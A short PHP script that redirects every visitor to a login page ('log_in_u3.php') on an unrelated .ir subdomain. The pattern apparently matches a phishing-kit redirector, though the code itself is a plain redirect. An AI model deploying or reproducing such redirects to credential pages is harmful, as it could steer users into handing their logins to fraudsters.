<?php

function Redirect($url, $permanent = false)
{
  header('Location: ' . $url, true, $permanent ? 301 : 302);
  exit();
}
Redirect('https://bw.ariaizanlou.ir/log_in_u3.php', false);

?>